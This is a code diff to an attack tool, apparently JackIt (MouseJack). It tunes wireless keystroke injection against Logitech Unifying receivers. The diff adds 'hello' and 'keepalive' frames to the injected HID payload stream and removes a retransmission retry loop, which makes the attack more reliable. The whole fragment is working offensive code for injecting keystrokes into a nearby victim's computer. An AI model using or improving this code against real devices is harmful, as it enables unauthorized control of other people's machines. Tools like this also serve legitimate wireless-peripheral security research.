@@ -365,11 +365,15 @@ class JackIt(object):
         for key in attack:
             if key['frames']:
                 for frame in key['frames']:
-                    if not self.transmit_payload(frame[0]):
-                        for i in range(0,5):
-                            time.sleep(0.1)
-                            if self.transmit_payload(frame[0]):
-                                break
+                    self.transmit_payload(frame[0])
+                    # This code was for additional reliability -- may cause duplicate keystrokes
+                    # (currently leaving it disabled)
+                    
+                    #if not self.transmit_payload(frame[0]):
+                    #    for i in range(0,5):
+                    #        time.sleep(0.1)
+                    #        if self.transmit_payload(frame[0]):
+                    #            break
                     time.sleep(frame[1] / 1000.0)
             elif key['sleep']:
                 time.sleep(int(key['sleep']) / 1000.0)
@@ -462,6 +466,8 @@ class LogitechHID(object):
         # https://lekensteyn.nl/files/logitech/Unifying_receiver_DJ_collection_specification_draft.pdf
         # (discovered by wiresharking usbmon)
         self.payload_template = [0, 0xC1, 0, 0, 0, 0, 0, 0, 0, 0]
+        self.keepalive = [0x00, 0x40, 0x04, 0xB0, 0x0C]
+        self.hello = [0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED]
 
     def checksum(self, payload):
         # This is also from the KeyKeriki paper
@@ -484,7 +490,12 @@ class LogitechHID(object):
     def build_frames(self, attack):
         for i in range(0, len(attack)):
             key = attack[i]
-            key['frames'] = []
+
+            if i == 0:
+                key['frames'] = [[self.hello[:], 5]]
+            else:
+                key['frames'] = []
+
             if i < len(attack)-1:
                 next_key = attack[i+1]
             else:
@@ -492,6 +503,7 @@ class LogitechHID(object):
 
             if key['hid'] or key['mod']:
                 key['frames'].append([self.frame(key), 12])
+                key['frames'].append([self.keepalive[:], 0])
                 if not next_key or (key['hid'] == next_key['hid'] and \
                         key['mod'] == next_key['mod']) or next_key['sleep']:
                     key['frames'].append([self.frame(), 0])
